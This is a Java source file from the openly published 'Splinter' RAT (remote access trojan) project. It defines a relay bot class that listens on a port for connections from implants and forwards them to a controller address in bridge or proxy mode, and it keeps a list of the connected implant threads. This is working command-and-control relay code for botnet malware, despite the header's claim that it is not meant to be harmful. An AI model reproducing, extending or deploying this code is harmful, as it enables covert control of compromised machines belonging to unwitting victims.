/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package RelayBot;

import Controller.Drivers.Drivers;
import Controller.Thread.Thread_Terminal;
import Implant.Driver;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;

public class RelayBot_ServerSocket extends Thread
  implements Runnable
{
  static String strMyClassName = "RelayBot_ServerSocket";

  public static int svrSocketPort = -1;
  public static InetAddress localhost = null;
  public static ServerSocket svrSocket = null;
  public static String serverAddr = "";

  public static boolean serverSocketRunning = false;

  public static volatile boolean keepServerSocketOpen = true;

  public static String careOfAddress = " - ";

  public static volatile String strForwardAddressToController = "";
  public static int portToController = 0;

  public static boolean relay_bridge_enabled = false;
  public static boolean relay_proxy_enabled = false;

  public RelayBot_ServerSocket(boolean relayBridgeMode, boolean relayProxyMode, int serverSocketPort, String addressToCtrl, int portToCtrl)
  {
    try
    {
      relay_bridge_enabled = relayBridgeMode;
      relay_proxy_enabled = relayProxyMode;

      svrSocketPort = serverSocketPort;

      strForwardAddressToController = addressToCtrl;
      portToController = portToCtrl;

      Driver.alRandomUniqueImplantIDs = new ArrayList();
    }
    catch (Exception e)
    {
      Driver.eop("RelayBot_ServerSocket Constructor", strMyClassName, e, "", false);
    }
  }

  public void run()
  {
    keepServerSocketOpen = establishServerSocket(svrSocketPort);

    while (keepServerSocketOpen)
    {
      Socket sckClientSocket = null;
      Thread_Terminal terminal = null;
      try
      {
        sckClientSocket = svrSocket.accept();

        terminal = new Thread_Terminal(false, false, true, sckClientSocket);
        terminal.relay_Controller_Forward_Address = strForwardAddressToController;
        terminal.relay_Controller_Forward_Port = portToController;
        terminal.myCareOfAddress = careOfAddress;
        terminal.relay_mode_BRIDGE = relay_bridge_enabled;
        terminal.relay_mode_PROXY = relay_proxy_enabled;
        terminal.myRelaybot_ServerSocket = this;
        terminal.start();

        Driver.alRelayTerminals.add(terminal);

        updateConnectedImplants();

        Drivers.sop("\n\nTHREAD STARTED AND LINKED!");
      }
      catch (SocketException se)
      {
        Driver.sop("RelayBot ServerSocket is closed. I am terminaing waiting for connections.  Please re-establish ServerSocket if necessary");
        keepServerSocketOpen = false;
        break;
      }
      catch (Exception e)
      {
        Driver.eop("RelayBot_ServerSocket thead run", strMyClassName, e, "Not a problem. Perhaps remote agent disconnected. Please re-establish the server socket if necessary", false);
      }

    }

    Driver.sop("RelayBot is Terminating ServerSocket...");
  }

  public static boolean updateConnectedImplants()
  {
    try
    {
      DEPRECATED_RelayBot_ForwardConnectionThread controller = null;

      DEPRECATED_RelayBot_AgentConnectedToRelayBot implant = null;

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("updateConnectedImplants", strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean establishServerSocket(int prt)
  {
    try
    {
      serverSocketRunning = false;
      keepServerSocketOpen = false;
      try
      {
        svrSocket = new ServerSocket(prt);
      }
      catch (SocketException se)
      {
        Driver.sop("Unable to bind to port " + prt + ". ServerSocket is Closed. You must try another port in order to continue");
        return false;
      }

      localhost = InetAddress.getLocalHost();

      String success = " * * * * * ServerSocket Established at " + Driver.getTimeStamp_Without_Date() + " * * * * *\n" + 
        "Server HostName: " + localhost.getHostName() + "\n" + 
        "Server IP: " + localhost.getHostAddress() + "\n" + 
        "Listening for Implants on Port: " + prt;

      Driver.sop(success);

      careOfAddress = localhost.getHostAddress();

      keepServerSocketOpen = true;

      serverSocketRunning = true;

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("establishServerSocket", strMyClassName, e, "Unable to maintain established server socket", false);
    }

    return false;
  }

  public static boolean removeImplantThreadAgent(RelayBot_ForwardConnection threadToRemove)
  {
    try
    {
      if (threadToRemove == null) {
        return false;
      }
      return removeImplantThread(threadToRemove, threadToRemove.getId());
    }
    catch (Exception e)
    {
      Driver.eop("removeImplantThreadAgent", strMyClassName, e, "", false);
    }

    return false;
  }

  public static boolean removeImplantThread(RelayBot_ForwardConnection threadToRemove, long threadID_ToRemove)
  {
    try
    {
      if ((Driver.alRelayTerminals == null) || (Driver.alRelayTerminals.size() < 1))
      {
        Driver.sop("alRelayTerminals - ArrayList is empty. No clients further to remove");
        return false;
      }

      if (Driver.alRelayTerminals.contains(threadToRemove))
      {
        boolean success = Driver.alRelayTerminals.remove(threadToRemove);

        if (success)
        {
          Driver.sop("* Successfully removed thread id: " + threadToRemove);
          try
          {
            threadToRemove.sktConnection.close();
            Driver.sop("Forwardlink socket closed.");
          }
          catch (Exception localException1)
          {
          }
          try {
            threadToRemove.parent.sktMyConnection.close();
            Driver.sop("Backlink socket closed.");
          }
          catch (Exception localException2) {
          }
          try {
            threadToRemove.continueRun = false;
          }
          catch (Exception localException3) {
          }
        }
      }
      updateConnectedImplants();

      return true;
    }
    catch (Exception e)
    {
      Driver.sop("Exception handled when removing thread id: " + threadID_ToRemove + " in " + strMyClassName);

      updateConnectedImplants();
    }return false;
  }
}